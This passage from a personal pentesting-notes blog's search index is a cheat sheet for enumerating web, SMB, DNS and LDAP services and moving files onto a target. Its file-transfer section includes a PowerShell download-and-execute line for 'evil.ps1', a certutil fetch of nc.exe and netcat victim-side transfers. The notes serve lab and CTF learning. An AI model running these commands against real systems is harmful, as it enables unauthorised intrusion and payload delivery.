id="nikto">Nikto</span></h3><p><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p><p>Nikto it’s nice tool to examine a web server to find potential problems and security vulnerabilities.</p><p>Basic usage</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host https://10.10.10.10/</span><br></pre></td></tr></table></figure><h3><a href="#gobuster" class="header-anchor">#</a><span id="gobuster">Gobuster</span></h3><p><a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener">https://github.com/OJ/gobuster</a></p><p>It’s a tool for use brute-force folders and multiple extensions at once.</p><p>It has three main modes it can be used with:</p><pre><code>dir - the classic directory brute-forcing modedns - DNS subdomain brute-forcing modevhost - virtual host brute-forcing mode </code></pre><p><code>DIR</code> mode </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster -w /usr/share/wordlists/dirb/common.txt dir -u http://10.10.10.10 -x php,txt,html,cgi</span><br></pre></td></tr></table></figure><p><code>DNS</code> mode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dns -d domain.com -w wordlist.txt -i</span><br></pre></td></tr></table></figure><p><code>vhost</code> mode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u domain.com -w wordlist.txt -v</span><br></pre></td></tr></table></figure><h3><a href="#wfuzz" class="header-anchor">#</a><span id="wfuzz">WFUZZ</span></h3><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>Other tool for use brute-force like gobuster. I don’t want to do the same then i  will to put some example for scan a machine while HTTP are not accessible. We can return the ports request. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hc=404 -z range,1-65535 http://10.10.10.10:8080/request_to=http://127.0.0.1:FUZZ</span><br></pre></td></tr></table></figure><h3><a href="#ffuf" class="header-anchor">#</a><span id="ffuf">FFUF</span></h3><p><a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener">https://github.com/ffuf/ffuf</a></p><p>This tool I realy like, because it’s written in go and i thik it’s the most faster for do this jobs.<br>This code works for scan a VHOST and the web page return every time the same size every time. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://domain.com -H <span class="string">"Host: FUZZ.domain.com"</span> -fs 33 -<span class="built_in">fc</span> 401,403</span><br></pre></td></tr></table></figure><h3><a href="#dirsearch" class="header-anchor">#</a><span id="dirsearch">DIRSEARCH</span></h3><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>This written in python. I like this tool becase it’s very fastter too and easy to use. </p><p>This is my basic usage, do recursive.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://domain.com -E -r -w /usr/share/wordlist/wordlist.txt</span><br></pre></td></tr></table></figure><h2><a href="#smb-service" class="header-anchor">#</a><span id="smb-service">SMB SERVICE</span></h2><p>This protocol enable to access files on remote server, as well other resources, including printers. </p><h3><a href="#llist-all-folders" class="header-anchor">#</a><span id="llist-all-folders">Llist all folders</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.10</span><br><span class="line"></span><br><span class="line">smbmap -H 10.10.10.10</span><br><span class="line"></span><br><span class="line">/usr/share/doc/python3-impacket/examples/smbclient.py <span class="string">""</span> @10.10.10.10</span><br></pre></td></tr></table></figure><h3><a href="#generate-a-samba-server-with-impacket" class="header-anchor">#</a><span id="generate-a-samba-server-with-impacket">Generate a samba server with Impacket</span></h3><p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py</a></p><h4><a href="#make-server-on-linux" class="header-anchor">#</a><span id="make-server-on-linux">Make server on Linux</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver IGH /root/shells</span><br></pre></td></tr></table></figure><h4><a href="#mount-in-windows" class="header-anchor">#</a><span id="mount-in-windows">Mount in Windows</span></h4><blockquote><p>powershell </p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">"IGH"</span> <span class="literal">-PSProvider</span> <span class="string">"Filesystem"</span> <span class="literal">-Root</span> <span class="string">"\\10.10.10.10\IGH"</span></span><br></pre></td></tr></table></figure><blockquote><p>without powershell</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use z: \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>\IGH"</span><br></pre></td></tr></table></figure><h4><a href="#mount-in-linux" class="header-anchor">#</a><span id="mount-in-linux">Mount in Linux</span></h4><p>Is needed to have isntalled cifs-utils</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t cifs //10.10.10.10/igh ~/my-share/</span><br></pre></td></tr></table></figure><h3><a href="#enumeration-null-sessions" class="header-anchor">#</a><span id="enumeration-null-sessions">Enumeration null sessions</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.10 -N</span><br><span class="line"></span><br><span class="line">rpcclient -U &quot;&quot; -N 10.10.10.10</span><br></pre></td></tr></table></figure><h3><a href="#escaning-with-enum4linux" class="header-anchor">#</a><span id="escaning-with-enum4linux">Escaning with enum4linux</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 10.10.10.10</span><br></pre></td></tr></table></figure><h2><a href="#dns" class="header-anchor">#</a><span id="dns">DNS</span></h2><h3><a href="#nmap-dns-hostmanes-lookup" class="header-anchor">#</a><span id="nmap-dns-hostmanes-lookup">Nmap DNS hostmanes lookup</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -f -dns-server [IP DNS] [target ip range]</span><br></pre></td></tr></table></figure><p>Host lookup </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host -t ns 10.10.10.10</span><br></pre></td></tr></table></figure><p>Perform DNS IP Lookup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig a 10.10.10.10 @nameserver</span><br></pre></td></tr></table></figure><p>Perform MX Record Lookup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig mx 10.10.10.10 @nameserver</span><br></pre></td></tr></table></figure><p>Perform Zone Transfer with dig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr 10.10.10.10 @nameserver</span><br></pre></td></tr></table></figure><p>Windows DNS zone Transfer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -&gt; set type&#x3D;any -&gt; ls -d 10.10.10.10</span><br></pre></td></tr></table></figure><p>Linux DNS Zone Transfer </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr 10.10.10.10 @nameserver</span><br></pre></td></tr></table></figure><p>DNS Brute Force </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsrecon -d 10.10.10.10 -d &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;dnsmap.txt -t std --xml output.xml</span><br></pre></td></tr></table></figure><hr><h2><a href="#ldap-service" class="header-anchor">#</a><span id="ldap-service">LDAP SERVICE</span></h2><p>Anonymous authentication, you will be able to perform a LDAP search query without binding to the admin account.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -h 10.10.10.10 -p 389 -x -b &quot;dc&#x3D;internetghost,dc&#x3D;com&quot;</span><br></pre></td></tr></table></figure><p>Admin account, sometimes you may to run ldap queries as the admin in order to have additionnal information presented to you.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -b &quot;dc&#x3D;internetghost,dc&#x3D;com&quot; -H ldap:&#x2F;&#x2F;10.10.10.10 -D &quot;cn&#x3D;admin,dc&#x3D;internetghost,dc&#x3D;com&quot; -W</span><br></pre></td></tr></table></figure><h2><a href="#transfer-files" class="header-anchor">#</a><span id="transfer-files">Transfer files</span></h2><h3><a href="#http" class="header-anchor">#</a><span id="http">HTTP</span></h3><h4><a href="#python" class="header-anchor">#</a><span id="python">PYTHON</span></h4><p>You can create a temporal http server with python</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p>It also can specify which path to share</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000 --dir &#x2F;root&#x2F;shells</span><br></pre></td></tr></table></figure><h4><a href="#windows" class="header-anchor">#</a><span id="windows">WINDOWS</span></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iex(<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">"http://10.10.10.10/evil.ps1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">certutil.exe -urlcache -split -f "</span>http://<span class="number">10.10</span>.<span class="number">10.10</span>/nc.exe<span class="string">" nc.exe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">IWR -Uri "</span>http://<span class="number">10.10</span>.<span class="number">10.10</span>/n64.exe<span class="string">" -Outfile "</span>n64.exe<span class="string">"</span></span><br></pre></td></tr></table></figure><h4><a href="#linux" class="header-anchor">#</a><span id="linux">LINUX</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.10/evil.php</span><br></pre></td></tr></table></figure><h3><a href="#netcat" class="header-anchor">#</a><span id="netcat">NETCAT</span></h3><p>Hacker Machine</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444 &lt; file</span><br></pre></td></tr></table></figure><p>Victim machine </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.10.10 4444 &gt; file</span><br></pre></td></tr></table></figure><h3><a href="#ssh-scp" class="header-anchor">#</a><span id="ssh-scp">SSH - SCP</span></h3><p>The methodology is the same, but I prefer transfer write different methods in this example.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file</span></span><br><span class="line">spc /<span class="built_in">local</span>/folder/file.txt user@10.10.10.10:/path/folder/file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># folder</span></span><br><span class="line">spc -r user@10.10.10.10:/folder /path/folder/</span><br></pre></td></tr></table></figure><h3><a href="#samba" class="header-anchor">#</a><span id="samba">SAMBA</span></h3><h4><a href="#bash" class="header-anchor">#</a><span id="bash">BASH</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbserver smbFolder $(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure><h4><a href="#powershell" class="header-anchor">#</a><span id="powershell">Powershell</span></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; <span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">"SharedFolder"</span> <span class="literal">-PSProvider</span> <span class="string">"FileSystem"</span> <span class="literal">-Root</span> <span class="string">"\\10.10.14.18\smbFolder"</span> </span><br><span class="line">PS&gt; dir SharedFolder:\</span><br></pre></td></tr></table></figure><h4><a href="#using-credentials" class="header-anchor">#</a><span id="using-credentials">Using Credentials</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbserver smbFolder $(<span class="built_in">pwd</span>) -smb2support -user jack -password 1234</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; <span class="variable">$pass</span>= <span class="built_in">convertto-securestring</span> <span class="string">'1234'</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line">PS &gt; <span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Managment.Automation.PSCredential(<span class="string">'jack'</span>, <span class="variable">$pass</span>)</span><br><span class="line">PS &gt; <span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">"SharedFolder"</span> <span class="literal">-PSProvider</span> <span class="string">"FileSystem"</span> <span class="literal">-Credential</span> <span class="variable">$cred</span>  <span class="literal">-Root</span> <span class="string">"\\10.10.14.18\smbFolder"</span></span><br></pre></td></tr></table></figure>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h1><a href="#whoami" class="header-anchor">#</a><span id="whoami">Whoami</span></h1><p><img src="/img/Picture-profile-ico.png" alt="LOGO" title="LOGO"></p><p>Bienvenido a este blog,soy J4ck21. Mi objetivo es aprender y mejorar en el campo de la ciberseguridad, me apasiona romper cosas y esta web voy a utilizarlo para a ir publicando mis apuntes de lo que vamos aprendiendo.<br>Espero que sirva de ayuda a todos vosotros y vosotras.<br>Cualquier duda o propuesta de mejora no dudeis en contactar.</p><script src="https://www.hackthebox.eu/badge/12497"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>search</title>
      <link href="/search/index.html"/>
      <url>/search/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>items</title>
      <link href="/items/index.html"/>
      <url>/items/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>archives</title>
      <link href="/archives/index.html"/>
      <url>/archives/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
